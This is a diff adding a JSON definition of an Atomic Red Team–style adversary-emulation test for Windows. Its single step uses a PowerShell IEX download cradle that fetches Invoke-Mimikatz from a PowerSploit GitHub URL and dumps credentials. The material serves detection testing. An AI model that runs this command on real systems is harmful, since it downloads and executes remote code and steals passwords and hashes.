@@ -1,0 +1,31 @@
+{
+  "id": "f3132740-55bc-48c4-bcc0-758a459cd027",
+  "name": "Mimikatz",
+  "description": "Download Mimikatz and dump credentials. Upon execution, mimikatz dump details and password hashes will be displayed.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "af1de6f2-373f-437a-9d60-0e81feb412bb",
+      "type": "execute-command",
+      "data": {
+        "command": "powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds\"\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    }
+  ],
+  "tags": [
+    "T1059.001",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "mimurl",
+      "type": "url",
+      "description": "Mimikatz url",
+      "value": "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1"
+    }
+  ]
+}
